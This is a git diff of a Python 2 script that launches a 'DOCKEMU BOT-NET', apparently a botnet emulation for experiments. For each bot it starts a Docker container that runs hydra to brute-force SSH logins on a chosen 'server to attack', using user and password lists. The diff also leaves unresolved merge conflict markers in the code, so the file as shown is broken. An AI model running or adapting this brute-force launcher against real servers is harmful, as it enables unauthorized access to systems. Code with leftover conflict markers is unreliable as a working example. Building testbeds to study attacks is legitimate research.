@@ -14,6 +14,10 @@ delay=0
 #clear screen
 os.system(['clear','cls'][os.name =='nt'])
 
+#
+logging.basicConfig(filename='log/dockemu.log',level=logging.DEBUG)
+
+
 #intro banner
 print "##############################################"
 print "##############################################"
@@ -35,7 +39,7 @@ try:
 except KeyboardInterrupt:
 	sys.exit(0)
 except:
-	logging.warning(" bots not provided, using defaults (%s)"%bots)
+	print " bots not provided, using defaults (%s)"%bots
 	print
 
 #server to attack
@@ -47,7 +51,7 @@ try:
 except KeyboardInterrupt:
 	sys.exit(0)
 except:
-	logging.warning( "server not provided, using defaults (%s)"%server)
+	print  "server not provided, using defaults (%s)"%server
 	print 
 
 #duration of the experiment
@@ -57,7 +61,7 @@ try:
 except KeyboardInterrupt:
 	sys.exit(0)
 except:
-	logging.warning( "duration not provided, using defaults (%s)"%duration)
+	print "duration not provided, using defaults (%s)"%duration
 	print 
 
 
@@ -68,7 +72,7 @@ try:
 except KeyboardInterrupt:
 	sys.exit(0)
 except:
-	logging.warning( "delay not provided, using defaults (%s)"%delay)
+	print  "delay not provided, using defaults (%s)"%delay
 	print
 
 
@@ -77,15 +81,23 @@ print "##############################################"
 
 print "STARTING DOCKEMU BOT-NET ...."
 names=[]
+<<<<<<< HEAD
 logging.basicConfig(filename='/usr/local/dockemu_2/log/bots.log',
 		    level=logging.DEBUG,
 		    format='%(asctime)s %(message)s',
                     datefmt='%m/%d/%Y %I:%M:%S %p')
+=======
+#logging.basicConfig(filename='/usr/local/dockemu_master/log/bots.log', level=logging.DEBUG, format='%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
+>>>>>>> bdea22cf8ecf415dffe57982f3f3ff83c010dd92
 
 logging.debug('Start Logging')
 for i in range(bots):
 	logging.debug('Starting dockemu-%s'%i)
+<<<<<<< HEAD
 	cmd="docker run -d -v %s/log/:/var/log/dockemu/ --name  dockemu-%s -e 'server=%s' %s hydra -L users -V -P passwords -t 4 %s ssh &>/dev/null"%(ROOT,i,server,image,server)
+=======
+	cmd="docker run -d -v %s/log/:/var/log/dockemu/ --name  dockemu-%s -e 'server=%s' dockemu dockemu-%s &>/dev/null"%(ROOT,i,server,i)
+>>>>>>> bdea22cf8ecf415dffe57982f3f3ff83c010dd92
 	print cmd
 	try:
 		print
